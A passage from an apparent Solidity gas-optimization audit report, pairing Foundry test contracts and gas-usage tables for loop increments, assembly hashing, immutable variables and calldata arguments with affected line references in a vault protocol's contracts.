newOwner)         }     } }  ```  ### Gas Report ```js ╭────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract0 contract ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 60623              ┆ 261             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ updateOwner        ┆ 5302            ┆ 5302 ┆ 5302   ┆ 5302 ┆ 1       │ ╰────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract1 contract ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 54823              ┆ 232             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ assemblyUpdateOwner┆ 5236            ┆ 5236 ┆ 5236   ┆ 5236 ┆ 1       │ ╰────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ``` ### Lines - targets:Supply.sol:17  - FERC1155.sol:199  - FERC1155.sol:234  - Metadata.sol:17  - SupplyReference.sol:16  - Buyout.sol:47  - Buyout.sol:48  - Buyout.sol:49  - VaultFactory.sol:21  - Vault.sol:26  - Vault.sol:27  - Vault.sol:88  - Vault.sol:95  - Minter.sol:18  - Migration.sol:58  - Migration.sol:59  - VaultRegistry.sol:29  - VaultRegistry.sol:30  - VaultRegistry.sol:31  - BaseVault.sol:25   --- ## `unchecked{++i}` instead of `i++` (or use assembly when applicable)  Use `++i` instead of `i++`. This is especially useful in for loops but this optimization can be used anywhere in your code. You can also use `unchecked{++i;}` for even more gas savings but this will not check to see if `i` overflows. For extra safety if you are worried about this, you can add a require statement after the loop checking if `i` is equal to the final incremented value. For best gas savings, use inline assembly, however this limits the functionality you can achieve. For example you cant use Solidity syntax to internally call your own contract within an assembly block and external calls must be done with the `call()` or `delegatecall()` instruction. However when applicable, inline assembly will save much more gas.  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2 c2;     Contract3 c3;     Contract4 c4;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();         c3 = new Contract3();         c4 = new Contract4();     }      function testGas() public {         c0.iPlusPlus();         c1.plusPlusI();         c2.uncheckedPlusPlusI();         c3.safeUncheckedPlusPlusI();         c4.inlineAssemblyLoop();     } }  contract Contract0 {     //loop with i++     function iPlusPlus() public pure {         uint256 j = 0;         for (uint256 i; i < 10; i++) {             j++;         }     } }  contract Contract1 {     //loop with ++i     function plusPlusI() public pure {         uint256 j = 0;         for (uint256 i; i < 10; ++i) {             j++;         }     } }  contract Contract2 {     //loop with unchecked{++i}     function uncheckedPlusPlusI() public pure {         uint256 j = 0;         for (uint256 i; i < 10; ) {             j++;              unchecked {                 ++i;             }         }     } }  contract Contract3 {     //loop with unchecked{++i} with additional overflow check     function safeUncheckedPlusPlusI() public pure {         uint256 j = 0;         uint256 i = 0;         for (i; i < 10; ) {             j++;              unchecked {                 ++i;             }         }          //check for overflow         assembly {             if lt(i, 10) {                 mstore(0x00, "loop overflow")                 revert(0x00, 0x20)             }         }     } }  contract Contract4 {     //loop with inline assembly     function inlineAssemblyLoop() public pure {         assembly {             let j := 0              for {                 let i := 0             } lt(i, 10) {                 i := add(i, 0x01)             } {                 j := add(j, 0x01)             }         }     } }  ```  ### Gas Report  ```js  ╭────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract0 contract ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37687              ┆ 219             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ iPlusPlus          ┆ 2039            ┆ 2039 ┆ 2039   ┆ 2039 ┆ 1       │ ╰────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract1 contract ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37287              ┆ 217             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ plusPlusI          ┆ 1989            ┆ 1989 ┆ 1989   ┆ 1989 ┆ 1       │ ╰────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭────────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract3 contract     ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost        ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 42693                  ┆ 244             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name          ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ safeUncheckedPlusPlusI ┆ 1355            ┆ 1355 ┆ 1355   ┆ 1355 ┆ 1       │ ╰────────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract2 contract ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 35887              ┆ 210             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ uncheckedPlusPlusI ┆ 1329            ┆ 1329 ┆ 1329   ┆ 1329 ┆ 1       │ ╰────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract4 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 26881              ┆ 164             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ inlineAssemblyLoop ┆ 709             ┆ 709 ┆ 709    ┆ 709 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯  ```  ### Lines - FERC1155.sol:339  - FERC1155.sol:363  - Vault.sol:78  - Vault.sol:104  - Migration.sol:89  - VaultRegistry.sol:172   --- ## Use assembly to hash instead of Solidity  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testGas() public view {         c0.solidityHash(2309349, 2304923409);         c1.assemblyHash(2309349, 2304923409);     } }  contract Contract0 {     function solidityHash(uint256 a, uint256 b) public view {         //unoptimized         keccak256(abi.encodePacked(a, b));     } }  contract Contract1 {     function assemblyHash(uint256 a, uint256 b) public view {         //optimized         assembly {             mstore(0x00, a)             mstore(0x20, b)             let hashedVal := keccak256(0x00, 0x40)         }     } } ```  ### Gas Report  ```js ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract0 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 36687              ┆ 214             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ solidityHash       ┆ 313             ┆ 313 ┆ 313    ┆ 313 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 31281              ┆ 186             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ assemblyHash       ┆ 231             ┆ 231 ┆ 231    ┆ 231 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ```   ### Lines - FERC1155.sol:332  - FERC1155.sol:357  - FERC1155.sol:373  - FERC1155.sol:376  - FERC1155.sol:377  - FERC1155.sol:394  - Buyout.sol:456  - VaultFactory.sol:38  - VaultFactory.sol:46  - VaultFactory.sol:66  - Vault.sol:60  - Minter.sol:26   ---  ## Mark storage variables as `immutable` if they never change after contract initialization.  State variables can be declared as constant or immutable. In both cases, the variables cannot be modified after the contract has been constructed. For constant variables, the value has to be fixed at compile-time, while for immutable, it can still be assigned at construction time.  The compiler does not reserve a storage slot for these variables, and every occurrence is inlined by the respective value.  Compared to regular state variables, the gas costs of constant and immutable variables are much lower. For a constant variable, the expression assigned to it is copied to all the places where it is accessed and also re-evaluated each time. This allows for local optimizations. Immutable variables are evaluated once at construction time and their value is copied to all the places in the code where they are accessed. For these values, 32 bytes are reserved, even if they would fit in fewer bytes. Due to this, constant values can sometimes be cheaper than immutable values.   ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2  c2;          function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();              }      function testGas() public view {         c0.addValue();         c1.addImmutableValue();         c2.addConstantValue();     } }  contract Contract0 {     uint256 val;      constructor() {         val = 10000;     }      function addValue() public view {         uint256 newVal = val + 1000;     } }  contract Contract1 {     uint256 immutable val;      constructor() {         val = 10000;     }      function addImmutableValue() public view {         uint256 newVal = val + 1000;     } }  contract Contract2 {     uint256 constant val = 10;      function addConstantValue() public view {         uint256 newVal = val + 1000;     } }  ```  ### Gas Report ```js ╭────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract0 contract ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 54593              ┆ 198             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ addValue           ┆ 2302            ┆ 2302 ┆ 2302   ┆ 2302 ┆ 1       │ ╰────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 38514              ┆ 239             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ addImmutableValue  ┆ 199             ┆ 199 ┆ 199    ┆ 199 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract2 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 32287              ┆ 191             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ addConstantValue   ┆ 199             ┆ 199 ┆ 199    ┆ 199 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ```  ### Lines - Buyout.sol:29  - Buyout.sol:31  - Buyout.sol:33  - VaultFactory.sol:15  - Minter.sol:14  - Migration.sol:37  - Migration.sol:39  - BaseVault.sol:19   ---  ## Use `calldata` instead of `memory` for function arguments that do not get mutated. Mark data types as `calldata` instead of `memory` where possible. This makes it so that the data is not automatically loaded into memory. If the data passed into the function does not need to be changed (like updating values in an array), it can be passed in as `calldata`. The one exception to this is if the argument must later be passed into another function that takes an argument that specifies `memory` storage.    ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2 c2;     Contract3 c3;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();         c3 = new Contract3();     }      function testGas() public {         uint256[] memory arr = new uint256[](10);         c0.calldataArray(arr);         c1.memoryArray(arr);          bytes memory data = abi.encode("someText");         c2.calldataBytes(data);         c3.memoryBytes(data);     } }  contract Contract0 {     function calldataArray(uint256[] calldata arr) public {         uint256 j;         for (uint256 i; i < arr.length; i++) {             j = arr[i] + 10;         }     } }  contract Contract1 {     function memoryArray(uint256[] memory arr) public {         uint256 j;         for (uint256 i; i < arr.length; i++) {             j = arr[i] + 10;         }     } }  contract Contract2 {     function calldataBytes(bytes calldata data) public {         bytes32 val;         for (uint256 i; i < 10; i++) {             val = keccak256(abi.encode(data, i));         }     } }  contract Contract3 {     function memoryBytes(bytes memory data) public {         bytes32 val;         for (uint256 i; i < 10; i++) {             val = keccak256(abi.encode(data, i));         }     } } ```  ### Gas Report ```js ╭───────────────────────────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ src/test/GasTest.t.sol:Contract0 contract ┆                 ┆      ┆        ┆      ┆         │ ╞═══════════════════════════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost                           ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 97947                                     ┆ 521             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name                             ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ calldataArray                             ┆ 2824            ┆ 2824 ┆ 2824   ┆ 2824 ┆ 1       │ ╰───────────────────────────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭───────────────────────────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ src/test/GasTest.t.sol:Contract1 contract ┆                 ┆      ┆        ┆      ┆         │ ╞═══════════════════════════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost                           ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 128171                                    ┆ 672             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name                             ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ memoryArray                               ┆ 3755            ┆ 3755 ┆ 3755   ┆ 3755 ┆ 1       │ ╰───────────────────────────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭───────────────────────────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ src/test/GasTest.t.sol:Contract2 contract ┆                 ┆      ┆        ┆      ┆         │ ╞═══════════════════════════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost                           ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 100547                                    ┆ 534             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name                             ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ calldataBytes                             ┆ 4934            ┆ 4934 ┆ 4934   ┆ 4934 ┆ 1       │ ╰───────────────────────────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭───────────────────────────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ src/test/GasTest.t.sol:Contract3 contract ┆                 ┆      ┆        ┆      ┆         │ ╞═══════════════════════════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost                           ┆ Deployment Size ┆      ┆        ┆      ┆         │ 